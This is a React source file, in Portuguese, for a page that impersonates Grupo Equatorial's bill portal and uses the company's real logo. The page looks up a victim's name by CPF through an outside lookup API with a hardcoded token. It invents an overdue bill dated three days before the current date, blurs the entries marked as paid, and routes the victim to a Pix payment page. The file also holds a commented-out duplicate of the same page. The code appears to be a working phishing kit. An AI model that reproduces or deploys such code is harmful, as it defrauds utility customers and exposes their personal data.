import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';

function Debitos() {
  const location = useLocation();
  const navigate = useNavigate();
  const [cpf, setCpf] = useState('');
  const [nome, setNome] = useState('');
  const [dueDate, setDueDate] = useState('');

  useEffect(() => {
    const params = new URLSearchParams(location.search);
    const cpfParam = params.get('cpf');
    if (cpfParam) {
      setCpf(cpfParam);

      // Requisição à API para obter o nome
      fetch(`https://consulta.fontesderenda.blog/cpf.php?token=f29edd8e-9a7c-45c1-bbfd-5c7ecf469fca&cpf=${apenasNumeros(cpfParam)}`)
        .then((response) => response.json())
        .then((data) => {
          if (data && data.DADOS && data.DADOS.nome) {
            setNome(data.DADOS.nome); // Define o nome retornado pela API
          }
        })
        .catch((error) => {
          console.error('Erro ao consultar a API:', error);
          setNome('Nome não encontrado'); // Fallback em caso de erro
        });

      // Requisição à API DEBUG
      //   fetch(`https://consulta.fontesderenda.blog/cpf.php?token=f29edd8e-9a7c-45c1-bbfd-5c7ecf469fca&cpf=${apenasNumeros(cpfParam)}`)
      //     .then((response) => {
      //       // Verifica se a resposta é bem-sucedida
      //       if (!response.ok) {
      //         throw new Error(`Erro na API: ${response.status} - ${response.statusText}`);
      //       }
      //       return response.text(); // Usa .text() primeiro para verificar o conteúdo bruto
      //     })
      //     .then((text) => {
      //       console.log('Resposta bruta da API:', text); // Log para depuração
      //       if (!text) {
      //         throw new Error('Resposta vazia da API');
      //       }
      //       const data = JSON.parse(text); // Tenta parsear como JSON
      //       if (data && data.DADOS && data.DADOS.nome) {
      //         setNome(data.DADOS.nome);
      //       } else {
      //         setNome('Nome não encontrado');
      //       }
      //     })
      //     .catch((error) => {
      //       console.error('Erro ao consultar a API:', error);
      //       setNome('Erro ao buscar nome');
      //     });
      }

      const today = new Date();
      const due = new Date(today);
      due.setDate(today.getDate() - 3);
      setDueDate(due.toLocaleDateString('pt-BR'));
    }, [location]);

  function apenasNumeros(string) {
    var numsStr = string.replace(/[^0-9]/g, '');
    return numsStr;
  }

  const debtItems = [
    { month: '03/2025', amount: '137,00', status: 'pending', dueDate: dueDate, link: '/pagamento-pix?amount=13700' },
    { month: '02/2025', amount: '237,96', status: 'paid', paymentDate: '19/03/2025' },
    { month: '01/2025', amount: '152,21', status: 'paid', paymentDate: '29/01/2025' },
    { month: '12/2024', amount: '187,75', status: 'paid', paymentDate: '29/01/2025' },
    { month: '11/2024', amount: '173,14', status: 'paid', paymentDate: '19/12/2024' },
    { month: '10/2024', amount: '160,82', status: 'paid', paymentDate: '19/12/2024' },
  ];

  return (
    <div className="container">
      <div style={{ textAlign: 'center', width: '100%', maxWidth: '400px' }}>
        <header style={{ position: 'relative' }}>
          <img
            src="https://www.equatorialenergia.com.br/wp-content/themes/equatorial-energia-child/img/logo-white.png"
            alt="Grupo Equatorial Logo"
            style={{ width: '200px', marginTop: '20px', marginBottom: '20px' }}
          />
          <button
            style={{
              position: 'absolute',
              width: '70px',
              top: '7px',
              right: '5px',
              background: 'transparent',
              border: '2px solid white',
              borderRadius: '5px',
              padding: '5px 10px',
              color: 'white',
              fontSize: '1em',
              cursor: 'pointer',
            }}
          >
            MENU
          </button>
        </header>
        <section
          style={{
            marginTop: '30px',
            background: 'rgba(255, 255, 255, 0.1)',
            padding: '20px',
            borderRadius: '10px',
            textAlign: 'left',
          }}
        >
          <h2 style={{ fontSize: '1.5em', marginBottom: '20px', textAlign: 'center', fontWeight: 'bold' }}>
            Emitir segunda via e consultar débitos
          </h2>
          <p style={{ fontSize: '0.9em', marginBottom: '10px', textAlign: 'center' }}>Seja bem vindo!</p>
          <p style={{ fontSize: '0.9em', marginBottom: '10px', fontWeight: 'bold' }}>CPF cadastrado:</p>
          <div
            style={{
              display: 'flex',
              alignItems: 'center',
              background: 'rgba(255, 255, 255, 0.05)',
              padding: '10px',
              borderRadius: '25px',
              marginBottom: '20px',
            }}
          >
            <select
              value={cpf}
              onChange={(e) => setCpf(e.target.value)}
              style={{
                background: 'transparent',
                color: 'white',
                border: 'none',
                fontSize: '0.9em',
                marginLeft: '10px',
                outline: 'none',
                width: '100%',
              }}
            >
              <option value="" style={{ background: '#0A1F44', color: 'white' }}></option>
              {cpf && (
                <option value={cpf} style={{ background: '#0A1F44', color: 'white' }}>
                  {cpf}
                </option>
              )}
            </select>
            {nome && (
              <span style={{ color: 'white', fontSize: '0.9em', marginLeft: '10px' }}>
                ({nome})
              </span>
            )}
          </div>
          <p
            style={{
              color: '#ffcc00',
              fontWeight: 'bold',
              margin: '20px 0',
              fontSize: '0.9em',
            }}
          >
            NOVIDADE! Pague suas faturas on-line de forma prática e rápida, e nossa equipe de suporte reconecta sua energia automaticamente em instantes!
          </p>
          {debtItems.map((item, index) => (
            <div
              key={index}
              style={{
                background: 'rgba(255, 255, 255, 0.05)',
                padding: '15px',
                margin: '10px 0',
                borderRadius: '10px',
                border: '1px solid white',
                display: 'flex',
                justifyContent: 'space-between',
                alignItems: 'center',
                position: 'relative',
                filter: item.status === 'paid' ? 'blur(3px)' : 'none',
                pointerEvents: item.status === 'paid' ? 'none' : 'auto',
                cursor: item.status === 'pending' ? 'pointer' : 'default',
              }}
              onClick={item.status === 'pending' ? () => navigate(item.link + '&cpf=' + cpf) : null}
            >
              <div style={{ flex: 1 }}>
                <p style={{ marginBottom: '5px' }}>Referente a {item.month}</p>
                <p style={{ fontWeight: 'bold' }}>R$ {item.amount}</p>
              </div>
              <div style={{ textAlign: 'right' }}>
                <p style={{ marginBottom: '5px' }}>{item.status === 'pending' ? 'Vencimento' : 'Pagamento'}</p>
                <p
                  style={{
                    color: item.status === 'pending' ? '#ff0000' : '#00cc00',
                    fontWeight: 'bold',
                  }}
                >
                  {item.status === 'pending' ? item.dueDate : item.paymentDate}
                </p>
              </div>
              {item.status === 'paid' && (
                <div
                  style={{
                    position: 'absolute',
                    top: '50%',
                    left: '50%',
                    transform: 'translate(-50%, -50%)',
                    width: '24px',
                    height: '24px',
                    border: '3px solid rgba(255, 255, 255, 0.3)',
                    borderTop: '3px solid white',
                    borderRadius: '50%',
                    animation: 'spin 1s linear infinite',
                  }}
                />
              )}
            </div>
          ))}
        </section>
      </div>
      <style>
        {`
          @keyframes spin {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
          }
        `}
      </style>
    </div>
  );
}

export default Debitos;

// import React, { useEffect, useState } from 'react';
// import { useLocation, useNavigate } from 'react-router-dom';

// function Debitos() {
//   const location = useLocation();
//   const navigate = useNavigate();
//   const [cpf, setCpf] = useState('');
//   const [dueDate, setDueDate] = useState('');

//   useEffect(() => {
//     const params = new URLSearchParams(location.search);
//     const cpfParam = params.get('cpf');
//     if (cpfParam) setCpf(cpfParam);

//     const today = new Date();
//     const due = new Date(today);
//     due.setDate(today.getDate() - 3);
//     setDueDate(due.toLocaleDateString('pt-BR'));
//   }, [location]);

//   const debtItems = [
//     { month: '03/2025', amount: '137,00', status: 'pending', dueDate: dueDate, link: '/pagamento-pix?amount=13700' },
//     { month: '02/2025', amount: '237,96', status: 'paid', paymentDate: '19/03/2025' },
//     { month: '01/2025', amount: '152,21', status: 'paid', paymentDate: '29/01/2025' },
//     { month: '12/2024', amount: '187,75', status: 'paid', paymentDate: '29/01/2025' },
//     { month: '11/2024', amount: '173,14', status: 'paid', paymentDate: '19/12/2024' },
//     { month: '10/2024', amount: '160,82', status: 'paid', paymentDate: '19/12/2024' },
//   ];

//   return (
//     <div className="container">
//       <div style={{ textAlign: 'center', width: '100%', maxWidth: '400px' }}>
//         <header style={{ position: 'relative' }}>
//           <img
//             src="https://www.equatorialenergia.com.br/wp-content/themes/equatorial-energia-child/img/logo-white.png"
//             alt="Grupo Equatorial Logo"
//             style={{ width: '200px', marginTop: '20px', marginBottom: '20px' }}
//           />
//           <button
//             style={{
//               position: 'absolute',
//               width: '70px',
//               top: '7px',
//               right: '5px',
//               background: 'transparent',
//               border: '2px solid white',
//               borderRadius: '5px',
//               padding: '5px 10px',
//               color: 'white',
//               fontSize: '1em',
//               cursor: 'pointer',
//             }}
//           >
//             MENU
//           </button>
//         </header>
//         <section
//           style={{
//             marginTop: '30px',
//             background: 'rgba(255, 255, 255, 0.1)',
//             padding: '20px',
//             borderRadius: '10px',
//             textAlign: 'left',
//           }}
//         >
//           <h2 style={{ fontSize: '1.5em', marginBottom: '20px', textAlign: 'center', fontWeight: 'bold' }}>
//             Emitir segunda via e consultar débitos
//           </h2>
//           <p style={{ fontSize: '0.9em', marginBottom: '10px', textAlign: 'center' }}>Seja bem vindo!</p>
//           <p style={{ fontSize: '0.9em', marginBottom: '10px', fontWeight: 'bold' }}>CPF cadastrado:</p>
//           <div
//             style={{
//               display: 'flex',
//               alignItems: 'center',
//               background: 'rgba(255, 255, 255, 0.05)',
//               padding: '10px',
//               borderRadius: '25px',
//               marginBottom: '20px',
//             }}
//           >
//             <select
//               value={cpf}
//               onChange={(e) => setCpf(e.target.value)}
//               style={{
//                 background: 'transparent',
//                 color: 'white',
//                 border: 'none',
//                 fontSize: '0.9em',
//                 marginLeft: '10px',
//                 outline: 'none',
//                 width: '100%',
//               }}
//             >
//               <option value="" style={{ background: '#0A1F44', color: 'white' }}></option>
//               {cpf && (
//                 <option value={cpf} style={{ background: '#0A1F44', color: 'white' }}>
//                   {cpf}
//                 </option>
//               )}
//             </select>
//           </div>
//           <p
//             style={{
//               color: '#ffcc00',
//               fontWeight: 'bold',
//               margin: '20px 0',
//               fontSize: '0.9em',
//             }}
//           >
//             NOVIDADE! Pague suas faturas on-line de forma prática e rápida, e nossa equipe de suporte reconecta sua energia automaticamente em instantes!
//           </p>
//           {debtItems.map((item, index) => (
//             <div
//               key={index}
//               style={{
//                 background: 'rgba(255, 255, 255, 0.05)',
//                 padding: '15px',
//                 margin: '10px 0',
//                 borderRadius: '10px',
//                 border: '1px solid white',
//                 display: 'flex',
//                 justifyContent: 'space-between',
//                 alignItems: 'center',
//                 position: 'relative',
//                 filter: item.status === 'paid' ? 'blur(3px)' : 'none',
//                 pointerEvents: item.status === 'paid' ? 'none' : 'auto',
//                 cursor: item.status === 'pending' ? 'pointer' : 'default',
//               }}
//               onClick={item.status === 'pending' ? () => navigate(item.link + '&cpf=' + cpf) : null}
//             >
//               <div style={{ flex: 1 }}>
//                 <p style={{ marginBottom: '5px' }}>Referente a {item.month}</p>
//                 <p style={{ fontWeight: 'bold' }}>R$ {item.amount}</p>
//               </div>
//               <div style={{ textAlign: 'right' }}>
//                 <p style={{ marginBottom: '5px' }}>{item.status === 'pending' ? 'Vencimento' : 'Pagamento'}</p>
//                 <p
//                   style={{
//                     color: item.status === 'pending' ? '#ff0000' : '#00cc00',
//                     fontWeight: 'bold',
//                   }}
//                 >
//                   {item.status === 'pending' ? item.dueDate : item.paymentDate}
//                 </p>
//               </div>
//               {item.status === 'paid' && (
//                 <div
//                   style={{
//                     position: 'absolute',
//                     top: '50%',
//                     left: '50%',
//                     transform: 'translate(-50%, -50%)',
//                     width: '24px',
//                     height: '24px',
//                     border: '3px solid rgba(255, 255, 255, 0.3)',
//                     borderTop: '3px solid white',
//                     borderRadius: '50%',
//                     animation: 'spin 1s linear infinite',
//                   }}
//                 />
//               )}
//             </div>
//           ))}
//         </section>
//       </div>
//       <style>
//         {`
//           @keyframes spin {
//             0% { transform: translate(-50%, -50%) rotate(0deg); }
//             100% { transform: translate(-50%, -50%) rotate(360deg); }
//           }
//         `}
//       </style>
//     </div>
//   );
// }

// export default Debitos;